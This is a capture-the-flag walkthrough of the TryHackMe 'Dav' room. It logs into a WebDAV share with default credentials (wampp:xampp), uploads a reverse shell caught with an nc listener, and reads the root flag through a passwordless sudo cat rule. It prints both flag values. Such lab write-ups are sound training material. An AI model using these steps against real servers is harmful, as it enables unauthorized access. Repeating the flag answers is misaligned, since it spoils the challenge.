+++
title = "Tryhackme Dav"
date = "2021-10-25"
author = "0xm4g1c"
cover = ""
tags = ["webdav", "cadaver"]
description = "Easy TryHackMe Challenge"
showFullContent = false
readingTime = true
+++

### Scanning
Open Ports:
- 80 > http
- 5280 > xmmp-bosh ?



### Enumeration

Web


Nothing useful in the web page as it is an Apache default page. enumerating its hidden directories we come across a `/webdav` thats prompting us for credentials we do not have.

```
/index.html
/server-status
/webdav
```
we got webdav which is also known as Web Distributed Authoring and Versioning which is used for remote authorising and stuff. Then I searched for Webdav default credentials and found this default creds `wampp : xampp`. To connect to the webserver and perform CRUD actions we use a tool called `cadaver`

```
➜  dav  cadaver http://10.10.105.112/webdav
Authentication required for webdav on server `10.10.105.112':
Username: wampp
Password:
dav:/webdav/>
dav:/webdav/>
dav:/webdav/> help
Available commands:
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 26  2019
dav:/webdav/> get passwd.dav
Downloading `/webdav/passwd.dav' to passwd.dav:
```

since we can read `passwd.dav` -- we try and upload a reverse shell,  fortunatelly we get a connection back.


### Foothold

```
➜  dav  nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.105.112 59642
```

upgrade shell and locate flags

```
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ cd /home
www-data@ubuntu:/home$ ls
merlin  wampp
www-data@ubuntu:/home/wampp$ cd /home/merlin/
www-data@ubuntu:/home/merlin$ ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```


### Privesc

Checking our privileges with sudo -l reveals that we can cat any file with sudo without password. Let’s get the root flag:

```
www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```
